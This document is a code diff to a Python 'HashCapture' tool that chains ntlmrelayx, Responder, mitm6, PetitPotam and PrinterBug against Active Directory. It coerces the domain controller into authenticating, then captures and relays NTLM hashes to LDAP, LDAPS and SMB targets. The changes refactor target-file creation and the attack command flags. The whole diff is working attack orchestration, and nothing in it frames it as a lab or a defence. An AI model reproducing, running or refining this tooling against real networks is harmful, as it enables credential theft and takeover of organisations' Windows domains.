@@ -38,6 +38,7 @@ class HashCapture:
         self.attack_threads = []
         self.local_ip = self.get_local_ip()
         self.original_ipv6_forward = None
+        self.dc_ip = None
 
         # Get the global logger instance
         self.logger = logging.getLogger(__name__)
@@ -67,21 +68,6 @@ class HashCapture:
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
 
-    def create_targets_file(self):
-        """Create the targets file for ntlmrelayx"""
-        try:
-            with open("targets.txt", "w") as f:
-                if self.domain:
-                    dc_ip = self.get_dc_ip()
-                    if dc_ip:
-                        f.write(f"ldaps://{dc_ip}\n")
-                        f.write(f"ldap://{dc_ip}\n")
-                        f.write(f"smb://{dc_ip}\n")
-            return True
-        except Exception as e:
-            self.logger.error(f"Failed to create targets file: {e}")
-            return False
-
     def check_dns_port(self):
         """Check if port 53 is available"""
         try:
@@ -89,13 +75,36 @@ class HashCapture:
             sock.bind(('', 53))
             sock.close()
             return True
-        except socket.error:
-            self.logger.error("Port 53 is already in use. Please stop any DNS service before running this tool.")
+        except socket.error as e:
+            self.logger.error(f"Port 53 is in use: {e}")
             try:
                 output = subprocess.check_output("netstat -tulpn | grep :53", shell=True).decode()
                 self.logger.error(f"Process using port 53: {output.strip()}")
             except:
                 pass
+            return False
+
+    def create_targets_file(self):
+        """Create targets file for ntlmrelayx"""
+        try:
+            if not self.domain:
+                self.logger.warning("No domain specified for targets file")
+                return True
+
+            self.dc_ip = self.get_dc_ip()
+            if not self.dc_ip:
+                self.logger.error(f"Could not resolve domain controller for {self.domain}")
+                return False
+
+            with open("targets.txt", "w") as f:
+                f.write(f"ldaps://{self.dc_ip}\n")
+                f.write(f"ldap://{self.dc_ip}\n")
+                f.write(f"smb://{self.dc_ip}\n")
+            
+            self.logger.info("Created targets file successfully")
+            return True
+        except Exception as e:
+            self.logger.error(f"Failed to create targets file: {e}")
             return False
 
     def setup_ipv6_forwarding(self):
@@ -157,11 +166,13 @@ class HashCapture:
         try:
             while True:
                 line = process.stdout.readline()
-                if not line and process.poll() is not None:
-                    break
-                if line:
-                    line_str = line.strip()
-                    logger.info(f"{name}: {line_str}")
+                if not line:
+                    if process.poll() is not None:
+                        break
+                    continue
+                line_str = line.strip()
+                if line_str:
+                    logger.info(f"{line_str}")
         except Exception as e:
             self.logger.error(f"Error processing output for {name}: {e}")
 
@@ -172,15 +183,16 @@ class HashCapture:
                 "ntlmrelayx.py",
                 "-tf", "targets.txt",
                 "-smb2support",
-                "-6",  # Enable IPv6
-                "-wh", self.local_ip,
-                "--no-http-server",  # Disable HTTP server
-                "--no-wcf",  # Disable WCF
+                "--no-http-server",
                 "-debug"
             ]
             
             if self.domain:
-                cmd.extend(["-domain", self.domain])
+                cmd.extend([
+                    "--no-wcf",
+                    "--no-raw",
+                    "-wh", self.local_ip
+                ])
             
             self.logger.info(f"Starting NTLM relay with command: {' '.join(cmd)}")
             process = Popen(
@@ -210,8 +222,7 @@ class HashCapture:
             cmd = [
                 "responder",
                 "-I", self.interface,
-                "-wd",  # Enable WPAD and DNS
-                "-v"    # Verbose
+                "-wrfv"  # Enable WinRM, Responder, and File Server
             ]
 
             self.logger.info(f"Starting Responder with command: {' '.join(cmd)}")
@@ -245,7 +256,6 @@ class HashCapture:
             cmd = [
                 "mitm6",
                 "-i", self.interface,
-                "-v",
                 "--debug"
             ]
             
@@ -277,16 +287,18 @@ class HashCapture:
     def start_petitpotam(self):
         """Start PetitPotam attack"""
         try:
-            if not self.domain or not self.get_dc_ip():
+            if not self.domain or not self.dc_ip:
                 self.logger.warning("PetitPotam attack requires a valid domain")
                 return False
 
             cmd = [
                 "petitpotam.py",
-                "-pipe", "efsr",
-                self.local_ip,     # Listener
-                self.get_dc_ip(),  # Target
-                "-no-pass"
+                "-u", "anonymous",
+                "-d", self.domain,
+                "-dc-ip", self.dc_ip,
+                "-target", self.local_ip,
+                self.local_ip,
+                self.dc_ip
             ]
             
             self.logger.info(f"Starting PetitPotam with command: {' '.join(cmd)}")
@@ -314,14 +326,14 @@ class HashCapture:
     def start_printerbug(self):
         """Start PrinterBug attack"""
         try:
-            if not self.domain or not self.get_dc_ip():
+            if not self.domain or not self.dc_ip:
                 self.logger.warning("PrinterBug attack requires a valid domain")
                 return False
 
             cmd = [
                 "printerbug.py",
-                f"{self.domain}/",
-                self.get_dc_ip(),
+                f"{self.domain}/anonymous",
+                self.dc_ip,
                 "-no-pass"
             ]
             
@@ -357,6 +369,7 @@ class HashCapture:
                 try:
                     process.wait(timeout=5)
                 except subprocess.TimeoutExpired:
+                    self.logger.warning(f"Force killing {name}")
                     process.kill()
                     process.wait()
             except Exception as e:
@@ -368,8 +381,8 @@ class HashCapture:
     def run(self):
         """Main execution flow"""
         self.logger.info("Starting Hash Capture Operation")
-
-        # Create targets file for ntlmrelayx
+        
+        # Create targets file if domain is specified
         if not self.create_targets_file():
             self.logger.error("Failed to create targets file")
             return False
@@ -397,6 +410,7 @@ class HashCapture:
                     thread.daemon = True
                     thread.start()
                     self.attack_threads.append(thread)
+                    time.sleep(1)  # Small delay between starting attacks
                     self.logger.info(f"{attack_name} attack thread started successfully")
                 except Exception as e:
                     self.logger.error(f"Failed to start {attack_name} attack: {e}")
@@ -416,6 +430,7 @@ class HashCapture:
         
         return True
 
+# Part 2 to fix indents
 def main():
     parser = argparse.ArgumentParser(description="Hash Capture Tool")
     parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
